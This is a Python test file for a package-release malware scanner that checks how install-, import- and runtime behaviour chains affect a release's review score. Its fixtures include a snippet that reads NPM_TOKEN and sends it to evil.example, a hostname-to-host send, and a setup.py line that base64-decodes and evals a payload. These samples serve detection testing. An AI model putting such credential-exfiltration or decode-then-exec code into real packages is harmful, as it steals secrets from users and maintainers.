"""Install and import behavior chains floor review. Runtime chains do not."""

from hunter.bands import REVIEW_FLOOR
from hunter.behavior import find_behavior_chains
from hunter.classify import classify_files
from hunter.head import load_head
from hunter.investigate import build_evidence
from hunter.jev import ChoiceView, JevResult, NoulView, ScoreView
from hunter.models import ReleaseMeta
from hunter.triage import diff_trees


class ClearNo:
    """Every Noul is a clear no. Choices stay valid so a review floor can finish."""

    def system_one(self, state, questions):
        del state
        result = JevResult(model="jev-1.13.0")
        for key, question in questions.items():
            if question["type"] == "noul":
                result.nouls[key] = NoulView(0.04)
            elif question["type"] == "choice":
                options = list(question["criteria"])
                result.choices[key] = ChoiceView(options[0], {options[0]: 1.0}, 0.5)
            else:
                result.scores[key] = ScoreView(0.0, {"0": 1.0}, 0.5, {"0": "local"})
        return result


def _meta(*, ecosystem: str = "npm", name: str = "widget") -> ReleaseMeta:
    return ReleaseMeta(
        ecosystem=ecosystem,
        name=name,
        new_version="1.0.1",
        old_version="1.0.0",
        rank=3,
        registry_url="https://example.test/widget",
    )


def _score(old, new, meta=None):
    return classify_files(
        meta=meta or _meta(),
        old_files=old,
        new_files=new,
        jev=ClearNo(),
        head=load_head(),
    )


def test_import_time_exfil_reaches_review_when_scout_is_a_clear_no():
    old = {"pkg/__init__.py": "def ready():\n    return True\n"}
    new = {
        "pkg/__init__.py": (
            "import os\n"
            "import urllib.request\n"
            "def send():\n"
            "    token = os.environ['NPM_TOKEN']\n"
            "    urllib.request.urlopen('https://evil.example/x?t=' + token)\n"
            "send()\n"
        )
    }
    result = _score(old, new, _meta(ecosystem="pypi", name="pkg"))
    assert result.band == "review"
    assert result.malice_probability >= REVIEW_FLOOR
    assert "pass_a_gate" not in result.signals
    chain = next(signal for signal in result.signals if signal.startswith("behavior_chain:"))
    assert "import pkg/__init__.py:" in chain
    assert "read credential, then send to new host" in chain
    evidence = build_evidence(result)
    assert evidence["behavior_sequence"] == [
        "import pkg/__init__.py: read credential, then send to new host"
    ]
    assert "Phase and order matter" in evidence["task"]


def test_network_import_without_a_read_stays_a_clear_benign():
    old = {"index.js": "function add(a, b) { return a + b; }\n"}
    new = {"index.js": 'fetch("https://evil.example/api/items");\n'}
    result = _score(old, new)
    assert result.band == "benign"
    assert result.malice_probability < REVIEW_FLOOR
    assert "pass_a_gate" in result.signals
    assert not any(signal.startswith("behavior_chain:") for signal in result.signals)
    assert not any(signal.startswith("runtime_behavior_chain:") for signal in result.signals)
    assert "behavior_sequence" not in build_evidence(result)


def test_runtime_only_chain_does_not_floor_the_score():
    old = {"index.js": "function add(a, b) { return a + b; }\n"}
    new = {
        "index.js": "function add(a, b) { return a + b; }\n",
        "lib/worker.js": (
            "function ship() {\n"
            "  const name = os.hostname();\n"
            "  fetch('https://evil.example/t');\n"
            "}\n"
        ),
    }
    result = _score(old, new)
    assert result.band == "benign"
    assert result.malice_probability < REVIEW_FLOOR
    assert "pass_a_gate" in result.signals
    assert not any(signal.startswith("behavior_chain:") for signal in result.signals)
    chain = next(signal for signal in result.signals if signal.startswith("runtime_behavior_chain:"))
    assert chain.startswith("runtime_behavior_chain:run lib/worker.js:")
    assert "read host or user, then send to new host" in chain


def test_nested_decode_then_exec_is_an_install_chain():
    old = {"setup.py": "from setuptools import setup\nsetup(name='pkg')\n"}
    new = {
        "setup.py": "from setuptools import setup\nsetup(name='pkg')\n"
        "eval(__import__('base64').b64decode('bm9uZQ=='))\n"
    }
    kept = diff_trees(old, new)
    triggering, runtime = find_behavior_chains(old, new, kept)
    assert runtime == []
    assert triggering == ["install setup.py: fetch or decode payload, then execute"]


def test_send_before_read_is_not_an_exfil_chain():
    old = {"pkg/__init__.py": "x = 1\n"}
    new = {
        "pkg/__init__.py": (
            "import os\n"
            "import urllib.request\n"
            "urllib.request.urlopen('https://evil.example/x')\n"
            "token = os.environ['NPM_TOKEN']\n"
        )
    }
    kept = diff_trees(old, new)
    triggering, runtime = find_behavior_chains(old, new, kept)
    assert triggering == []
    assert runtime == []
